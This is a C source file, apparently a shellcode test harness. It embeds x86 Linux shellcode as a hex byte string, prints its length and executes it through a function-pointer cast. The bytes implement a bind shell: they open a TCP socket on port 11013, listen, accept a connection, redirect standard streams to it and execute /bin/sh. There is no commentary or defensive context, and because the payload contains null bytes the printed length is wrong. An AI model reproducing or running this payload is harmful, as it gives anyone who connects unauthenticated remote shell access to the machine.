#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x66\x58\x31\xdb\x43\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x56\x68\x2b\x05\x00\x00\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x56\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x56\x56\x57\x89\xe1\xcd\x80\x89\xc7\x89\xfb\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x56\x53\x89\xe1\x89\xf2\xcd\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
